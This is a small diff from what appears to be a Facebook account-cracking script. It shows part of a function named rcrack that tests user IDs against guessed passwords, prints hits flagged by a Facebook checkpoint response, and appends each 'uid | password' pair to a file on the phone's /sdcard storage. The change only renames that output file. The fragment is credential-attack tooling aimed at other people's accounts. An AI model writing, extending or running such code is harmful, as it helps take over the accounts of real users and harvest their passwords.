@@ -400,7 +400,7 @@ def rcrack(uid,pwx,tl):
                 break
             elif 'www.facebook.com' in str(lo):            	
                 print(f"\x1b[1;90m❮✘❯ {uid} | {ps}")
-                open('/sdcard/MYAN-2-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                open('/sdcard/WT4P-1-CP.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break            
             else:
